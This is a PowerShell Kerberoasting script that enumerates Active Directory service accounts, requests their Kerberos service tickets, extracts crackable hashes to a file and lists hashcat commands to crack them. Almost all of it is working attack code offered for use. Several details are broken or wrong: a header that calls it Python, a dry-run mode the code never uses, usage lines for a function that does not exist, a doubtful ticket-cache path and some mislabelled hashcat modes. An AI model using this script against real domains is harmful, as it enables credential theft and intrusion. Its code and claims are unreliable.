######################################################################################################################################################################################################################
# Initial python script framework, for attacking Kerberos: Be mindful of the scope of work, & rules of engagement. By 41ph4-01, and our community.
# Ensure .env (hidden file in this directory) is in the same directory, and set to true for dry run (sumulation mode (non distructive). Test in a secure and controlled environment to avoid any unintended consequences.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

Import-Module ActiveDirectory -ErrorAction Stop

function Get-SPNUsers {
    Write-Host "[*] Enumerating AD user accounts with SPNs..."
    return Get-ADUser -Filter { servicePrincipalName -like "*" } -Properties ServicePrincipalName,sAMAccountName
}

function Request-TgsForSPN {
    param (
        [string]$SPN
    )
   
    try {
        $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken($SPN)
        $identity = $token.GetRequest() # Forces ticket request.
        Write-Host "    Requested TGS for $SPN"
    }
    catch {
        Write-Warning "    Failed requesting TGS for $SPN: $_"
    }
}

function Read-KerberosTickets {
    $cacheFolder = Join-Path $env:USERPROFILE "AppData\Local\Microsoft\Windows\Kerberos\Cache"
    if (-not (Test-Path $cacheFolder)) {
        Write-Warning "Kerberos cache folder not found: $cacheFolder"
        return @()
    }
    $files = Get-ChildItem -Path $cacheFolder -File -ErrorAction SilentlyContinue
    $tickets = @()
    foreach ($file in $files) {
        try {
            $bytes = [System.IO.File]::ReadAllBytes($file.FullName)
            $tickets += [PSCustomObject]@{
                File = $file.Name
                Bytes = $bytes
            }
        }
        catch {
            Write-Warning "Failed reading ticket $($file.Name): $_"
        }
    }
    return $tickets
}

function Parse-DerTicket {
    param (
        [byte[]]$Data
    )
  

   
    function BytesToAscii([byte[]]$b) {
        return [System.Text.Encoding]::ASCII.GetString($b).Trim([char]0)
    }



    $etype = 0
    $realm = ""
    $username = ""
    $spn = ""
    $checksum = ""
    $ciphertext = ""
    $salt = ""

    # Search for etype integer tag (0x02) with value 23,17,18
    for ($i=0; $i -lt $Data.Length - 4; $i++) {
        if ($Data[$i] -eq 0x02) {
            # length byte
            $len = $Data[$i+1]
            if ($len -gt 0 -and $len -lt 5) {
                $valBytes = $Data[($i+2)..($i+1+$len)]
                $val = 0
                foreach ($b in $valBytes) {
                    $val = ($val * 256) + $b
                }
                if ($val -in @(23,17,18)) {
                    $etype = $val
                    break
                }
            }
        }
    }

    if ($etype -eq 0) {
        Write-Verbose "No supported encryption type found in ticket."
        return $null
    }


    $encIndex = -1
    for ($i=0; $i -lt $Data.Length - 2; $i++) {
        if ($Data[$i] -eq 0x04) {
            $len = $Data[$i+1]
            if ($len -gt 10) {
               
                $encIndex = $i + 2
                break
            }
        }
    }
    if ($encIndex -eq -1) {
        Write-Verbose "No encrypted part found."
        return $null
    }

  
    $encLen = $Data[$encIndex - 1]
    $encData = $Data[$encIndex..($encIndex + $encLen - 1)]

    
    if ($etype -eq 23) {
        
        if ($encData.Length -lt 16) { return $null }
        $checksumBytes = $encData[0..15]
        $cipherBytes = $encData[16..($encData.Length - 1)]
        $checksum = ($checksumBytes | ForEach-Object { $_.ToString("x2") }) -join ""
        $ciphertext = ($cipherBytes | ForEach-Object { $_.ToString("x2") }) -join ""
    }
    elseif ($etype -eq 17 -or $etype -eq 18) {
        
        if ($encData.Length -lt 12) { return $null }
        $checksumBytes = $encData[0..11]
        $cipherBytes = $encData[12..($encData.Length - 1)]
        $checksum = ($checksumBytes | ForEach-Object { $_.ToString("x2") }) -join ""
        $ciphertext = ($cipherBytes | ForEach-Object { $_.ToString("x2") }) -join ""
        $salt = "UNKNOWN" 
    }
    else {
        Write-Verbose "Unsupported encryption type $etype"
        return $null
    }

  
    $asciiStr = [System.Text.Encoding]::ASCII.GetString($Data)
    $realmMatch = [regex]::Matches($asciiStr, "\b[A-Z0-9.-]{2,}\b") | Where-Object { $_.Value -match "^[A-Z0-9.-]+$" }
    if ($realmMatch.Count -gt 0) {
        $realm = $realmMatch[0].Value
        $salt = $realm.ToUpper()
    }

    
    $userMatch = [regex]::Matches($asciiStr, "\b[a-zA-Z0-9._-]{2,20}\b") | Where-Object { $_.Value -ne $realm }
    if ($userMatch.Count -gt 0) {
        $username = $userMatch[0].Value
    }

    
    $spnMatch = [regex]::Matches($asciiStr, "\b[a-zA-Z0-9._-]+\/[a-zA-Z0-9._-]+\b")
    if ($spnMatch.Count -gt 0) {
        $spn = $spnMatch[0].Value
    } else {
        $spn = "krbtgt/$realm"
    }

   
    if ($etype -eq 23) {
        $line = "`$krb5tgs`$23`$*$username*$realm*$spn*$checksum`$$ciphertext"
    }
    elseif ($etype -eq 17 -or $etype -eq 18) {
        $line = "`$krb5tgs`$$etype`$*$username*$realm*$spn*$checksum`$$ciphertext`$$salt"
    }
    else {
        return $null
    }
    return $line
}



$OutputFile = "$PWD\kerberoast_hashes.txt"
$hashes = @()

try {
    $spnUsers = Get-SPNUsers
    if ($spnUsers.Count -eq 0) {
        Write-Warning "No SPN accounts found."
        exit
    }

    Write-Host "[*] Requesting TGS tickets for SPNs..."
    foreach ($user in $spnUsers) {
        foreach ($spn in $user.ServicePrincipalName) {
            Request-TgsForSPN -SPN $spn
        }
    }

    Write-Host "[*] Waiting 5 seconds for tickets to cache..."
    Start-Sleep -Seconds 5

    $tickets = Read-KerberosTickets
    if ($tickets.Count -eq 0) {
        Write-Warning "No tickets found in cache."
        exit
    }

    Write-Host "[*] Parsing tickets and extracting hashes..."
    foreach ($ticket in $tickets) {
        $hash = Parse-DerTicket -Data $ticket.Bytes
        if ($hash) {
            Write-Host "[+] Extracted hash from $($ticket.File):"
            Write-Host $hash
            $hashes += $hash
        }
    }

    if ($hashes.Count -gt 0) {
        $hashes | Out-File -FilePath $OutputFile -Encoding ascii
        Write-Host "[*] Hashes saved to $OutputFile"
    }
    else {
        Write-Warning "No valid hashes extracted."
    }
}
catch {
    Write-Error $_
}

#Usage
# Load script (dot-source)
#. .\Invoke-DerKerberoast.ps1

# Run with defaults
#Invoke-DerKerberoast

# Or specify domain and output file path
# Invoke-DerKerberoast -Domain "corp.example.com" -OutputFile "C:\temp\hashes.txt"
# hashcat -m 13100 kerberoast_hashes.txt your_wordlist.txt
# hashcat -m 13100 kerberoast_hashes.txt wordlist.txt   # For RC4
# hashcat -m 18200 kerberoast_hashes.txt wordlist.txt   # For AES256
# hashcat -m 18300 kerberoast_hashes.txt wordlist.txt   # For AES128

